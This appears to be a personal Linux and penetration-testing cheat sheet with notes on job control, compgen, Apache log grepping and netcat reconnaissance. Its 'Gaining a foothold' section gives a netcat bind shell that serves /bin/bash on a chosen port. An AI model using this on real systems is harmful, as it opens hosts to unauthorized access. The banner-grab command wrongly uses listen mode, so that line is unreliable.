# Linux  

## Check My IP `curl https://checkip.amazonaws.com`  

## Wait for a job/command to finish  
Will print PID and wait for the last PID in the queue
```
sleep 60 &
PID_number_of_last_command=$!
wait ${PID_number_of_last_command}

```
# What can run
```sh
compgen -c # Will list all the commands you could run.
compgen -a # Will list all the aliases you could run.
compgen -b # Will list all the built-ins you could run.
compgen -k # Will list all the keywords you could run.
compgen -A function # Will list all the functions you could run.
```

# Reconnaissance  
## Netcat is not Ncat
Fun not-a-fact: Ncat comes from Nmap according to a post on a forum.  
- Banner
```sh
# Print the banner of a webserver
nc -l $target_ip 80
```  
and then as a payload
```http
HEAD / HTTP/1.0
```

# GREP  
Find a string  
```sh
sudo grep -E '\" [1345][01235][0-9] [[:digit:]]{1,8} \"' /var/log/apache2/access.log

# Real time tailing logs
sudo tail -f /var/log/apache2/access.log | grep -E '\" [1345][01235][0-9] [[:digit:]]{1,8} \"'

# Run the results through grep to find any 500 status codes
grep "[: ]500[: ]" access.log

# Find any non 200 status codes
grep -v "[: ]200[: ]" access.log

# Find multiple status codes
grep -e "[: ]500[: ]" -e "[: ]405[: ]" -e "[: ]403[: ]" access_logs.txt

# To use grep to search a directory:
grep "[: ]200[: ]" -nr .
```

# Gaining a foothold
## Spawn a shell
```sh
port_number=$1
nc -l -p $port_number -e /bin/bash
```  
Spawn a shell: `nc -l -p 443 -e /bin/bash`  